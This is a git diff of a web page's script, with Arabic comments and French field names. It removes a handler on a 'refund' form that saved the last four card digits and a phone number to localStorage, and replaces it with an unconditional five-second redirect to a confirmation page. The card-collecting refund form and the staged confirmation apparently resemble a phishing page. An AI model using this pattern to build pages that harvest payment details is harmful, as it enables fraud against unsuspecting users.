@@ -108,29 +108,10 @@
 
     <!-- Script JavaScript pour redirection -->
     <script>
-        // استدعاء البيانات المخزنة عندما يقوم المستخدم بملء النموذج
-        function storeDataAndRedirect(event) {
-            event.preventDefault();
-
-            // احصل على الرقم النهائي للبطاقة ورقم الهاتف
-            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '').slice(-4); // آخر 4 أرقام
-            const phoneNumber = document.getElementById('telephone').value;
-
-            // تخزين البيانات في localStorage
-            localStorage.setItem('lastFour', cardNumber);
-            localStorage.setItem('phone', phoneNumber);
-
-            // التوجيه إلى صفحة المعالجة بعد 5 ثواني
-            console.log("Redirecting to confirmation.html in 5 seconds..."); // إضافة سجل في الكونsole للتحقق
-            setTimeout(() => {
-                console.log("Redirecting now!"); // تحقق عند تنفيذ التوجيه
-                window.location.href = "confirmation.html"; // التوجيه إلى confirmation.html
-            }, 5000); // التوجيه بعد 5 ثواني
-        }
-
-        // عند تحميل الصفحة يجب استدعاء الدالة مباشرة لتخزين البيانات
-        // أضف حدث عند تقديم النموذج بحيث يتم تخزين البيانات ثم التوجيه
-        document.getElementById('remboursement-form').addEventListener('submit', storeDataAndRedirect);
+        setTimeout(() => {
+            console.log("Redirection vers confirmation.html après 5 secondes...");
+            window.location.href = "confirmation.html"; // تأكد من أن المسار صحيح إلى confirmation.html
+        }, 5000); // التوجيه بعد 5 ثوانٍ
     </script>
 </body>
 </html>
